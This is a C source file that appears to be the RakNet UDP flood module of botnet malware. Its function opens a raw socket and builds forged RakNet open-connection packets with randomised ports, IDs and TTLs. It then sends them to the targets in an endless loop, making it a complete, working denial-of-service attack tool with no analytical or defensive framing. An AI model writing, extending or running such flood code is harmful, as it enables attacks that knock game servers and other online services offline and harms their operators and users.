#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_udpraknet(pflood_context_t ctx) {
  char **pkts = calloc(ctx->num_targs, sizeof(char *));
  int fd;

  uint16_t dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  uint16_t sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);
  uint16_t psleep = flood_retrieve_u16(ctx, OPT_SLEEP, 0);

  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
    PRINTF("Failed to create raw socket. aborting...\n");
    return;
  }

  int i = 1;
  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) {
    PRINTF("Failed to set IP_HDRINCL. aborting...\n");
    close(fd);
    return;
  }

  for (uint8_t i = 0; i < ctx->num_targs; i++) {
    pkts[i] = calloc(1510, sizeof(char));

    struct iphdr *iph = (struct iphdr *)pkts[i];
    struct udphdr *udph = (struct udphdr *)(iph + 1);

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
    iph->id = htons(65535);
    iph->ttl = (xoshiro_next() % 2 == 0) ? 64 : 128;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = network_local_addr();
    iph->daddr = ctx->targets[i].address;

    udph->source = htons(!sport ? (xoshiro_next() & 0xFFFF) + 1 : sport);
    udph->dest = htons(!dport ? (xoshiro_next() & 0xFFFF) + 1 : dport);
    udph->len = htons(sizeof(struct udphdr));
  }

  while (true) {
    for (uint8_t i = 0; i < ctx->num_targs; i++) {
      char *pkt = pkts[i];
      struct iphdr *iph = (struct iphdr *)pkt;
      struct udphdr *udph = (struct udphdr *)(iph + 1);
      char *data = (char *)(udph + 1);

      // shit way but whatever
      target_random_addr(&ctx->targets[i]);

      if (sport == 0) udph->source = htons((xoshiro_next() & 0xFFFF) + 1);
      if (dport == 0) udph->dest = htons((xoshiro_next() & 0xFFFF) + 1);

      iph->id = htons(xoshiro_next() % 0xffff);
      iph->ttl = (xoshiro_next() % 2 == 0) ? 64 : 128;

      int selected_payload = xoshiro_next() % 2;

      uint8_t RakNetOpenConn1[19];
      uint8_t RakNetOpenConn2[34];

      if (selected_payload == 0) {
        uint8_t RakNet1_MessageID[] = {0x05};
        uint8_t RakNet1_MessageData[] = {0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
                                         0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78};
        uint8_t RakNet1_ProtocolVersion = (xoshiro_next() % 6) + 6;
        uint8_t RakNet1_Null[] = {0x00};

        memcpy(RakNetOpenConn1, RakNet1_MessageID, sizeof(RakNet1_MessageID));
        memcpy(RakNetOpenConn1 + 1, RakNet1_MessageData, sizeof(RakNet1_MessageData));
        memcpy(RakNetOpenConn1 + 17, &RakNet1_ProtocolVersion, sizeof(RakNet1_ProtocolVersion));
        memcpy(RakNetOpenConn1 + 18, RakNet1_Null, sizeof(RakNet1_Null));

        memcpy(data, RakNetOpenConn1, sizeof(RakNetOpenConn1));
        iph->tot_len =
            htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(RakNetOpenConn1));
        udph->len = htons(sizeof(struct udphdr) + sizeof(RakNetOpenConn1));
      } else {
        uint8_t RakNet2_MessageID[] = {0x07};
        uint8_t RakNet2_MessageData[] = {0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
                                         0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78};
        uint8_t RakNet2_IPVersion = 0x04;

        uint32_t network_order = htonl(ctx->targets[i].address);
        uint8_t RakNet2_EncodedAddress[4] = {
            255 - ((network_order >> 24) & 0xFF), 255 - ((network_order >> 16) & 0xFF),
            255 - ((network_order >> 8) & 0xFF), 255 - (network_order & 0xFF)};

        uint8_t RakNet2_Port[2] = {(uint8_t)(dport >> 8), (uint8_t)(dport & 0xFF)};

        uint8_t RakNet2_MTUSize[] = {0x78, 0x05};
        uint8_t RakNet2_GUID[8];
        xoshiro_bytes(RakNet2_GUID, sizeof(RakNet2_GUID));

        memcpy(RakNetOpenConn2, RakNet2_MessageID, sizeof(RakNet2_MessageID));
        memcpy(RakNetOpenConn2 + 1, RakNet2_MessageData, sizeof(RakNet2_MessageData));
        memcpy(RakNetOpenConn2 + 17, &RakNet2_IPVersion, sizeof(RakNet2_IPVersion));
        memcpy(RakNetOpenConn2 + 18, RakNet2_EncodedAddress, sizeof(RakNet2_EncodedAddress));
        memcpy(RakNetOpenConn2 + 22, RakNet2_Port, sizeof(RakNet2_Port));
        memcpy(RakNetOpenConn2 + 24, RakNet2_MTUSize, sizeof(RakNet2_MTUSize));
        memcpy(RakNetOpenConn2 + 26, RakNet2_GUID, sizeof(RakNet2_GUID));

        memcpy(data, RakNetOpenConn2, sizeof(RakNetOpenConn2));
        iph->tot_len =
            htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(RakNetOpenConn2));
        udph->len = htons(sizeof(struct udphdr) + sizeof(RakNetOpenConn2));
      }

      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      udph->check = 0;
      udph->check = checksum_tcpudp(
          iph, udph, udph->len, sizeof(struct udphdr) + ntohs(udph->len) - sizeof(struct udphdr));

      ctx->targets[i].saddr.sin_port = udph->dest;
      sendto(fd, pkt, ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&ctx->targets[i].saddr,
             sizeof(struct sockaddr_in));
    }

    if (psleep > 0) usleep(psleep);
  }
}
